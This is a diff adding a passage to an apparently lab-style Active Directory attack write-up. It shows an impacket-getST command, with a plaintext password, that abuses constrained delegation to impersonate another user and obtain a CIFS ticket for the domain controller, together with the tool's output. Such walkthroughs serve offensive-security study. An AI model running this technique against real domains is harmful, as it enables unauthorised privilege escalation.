@@ -1488,3 +1488,16 @@ The user is no longer in the protected users group so now i can use this user to
 
 # Domain admin via Constrained Delegation
 
+```python
+impacket-getST NOVACART/m.brown:'Password123!' -spn cifs/DC.novacart.local -impersonate m.ibabao -dc-ip 10.0.18.23
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating m.ibabao
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in m.ibabao@cifs_DC.novacart.local@NOVACART.LOCAL.ccache
+```
+Now i can get a ticket for this user
+
